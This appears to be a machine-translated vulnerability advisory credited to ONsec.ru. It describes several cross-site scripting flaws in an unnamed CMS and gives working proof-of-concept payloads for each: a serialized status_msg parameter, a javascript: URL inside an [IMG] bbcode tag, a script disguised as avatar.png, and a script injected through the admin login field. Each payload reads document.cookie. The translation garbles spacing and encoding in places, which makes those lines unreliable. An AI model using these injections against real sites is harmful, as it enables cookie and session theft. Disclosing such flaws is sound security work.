Description: ================================================ ==== 
The vulnerability exists due to defect in the function test special

http://localhost:7777/_admin/forum.php 
http://localhost:7777/_admin/discussion.php 
http://localhost:7777/_admin/guestbook.php 
http://localhost:7777/_admin/blog.php 
http://localhost:7777/_admin/news.php 
http://localhost:7777/_admin/srv_updates.php 
http://localhost:7777/_admin/srv_backups.php 
http://localhost:7777/_admin/srv_twist_prevention.php 
http://localhost:7777/_admin/srv_tags.php

Special types of string parameter is as follows (the submission

2: (s: 3: "msg "; s: 68:" ONsec.ru - XSS test [ALERT] \ "); alert
(document.cookie) / / alert ([/ ALERT]"; s: 4: "type"; s: 4: "none ";}}} 

Implementation: 

http://localhost:7777/news/?status_msg=a% 3A2% 3A% 7Bs% 3A3% 3A% 22sys% 22%
3Ba% 3A0% 3A% 7B% 7Ds% 3A5% 3A% 22plain% 22% 3Ba% 3A1 % 3A% 7Bi% 3A0% 3Ba%

22none% 22% 3B% 7D% 7D% 7D 

================================================== ==== 
Vulnerability exists in the processing function values of the tag [IMG],
which serves to place the pictures in the message body. By sending a
special message on the forum, guestbook or leave a comment, an attacker can
execute arbitrary JavaScript code on the victim's computer, which will see
his message. The result of the example depends on the browser, checked on
Opera 9.52 build 10108. 
================================================== ==== 
Implementation: 

[IMG] javascript: alert (document.cookie +% 27 \ n \ nONsec.ru% 27) [/ IMG]


================================================== ==== 
The vulnerability exists due to the lack of checks on user avatars. An
attacker could upload an avatar with JavaScript code inside the file with
the extension. PNG,. JPG or other image. When you open a full reference to
this picture browser Internet Explorer <= 7, on a computer to execute
contained within JavaScript code. 
================================================== ==== 
Implementation: 

Create a file with the following contents: 

<script> alert (document.cookie + "\ n \ nONsec.ru") </ script> 

save it as avatar.png, then upload as your avatar. Open the link to the
downloaded file browser InternetExplorer <= 7. 

================================================== ==== 
The vulnerability exists due to the lack of filtering of characters in the
user name when logging into the administrative console. When sending a POST
request to a page http://localhost:7777/pages.php similar content: 
================================================== ==== 
username = "> <script> alert (document.cookie +" \ n \ nONsec.Ru ") </
script> 

application returns the following response: 

<input class=field style="width:100px" type=text name="loginname" value="">
<script> alert (document.cookie + "\ n \ nONsec.Ru") </ script> "> 

Implementation: 

In the administrative console login prompt, enter the user name: 

"> <script> alert (document.cookie +" \ n \ nONsec.Ru ") </ script> 

and will realize the login attempt
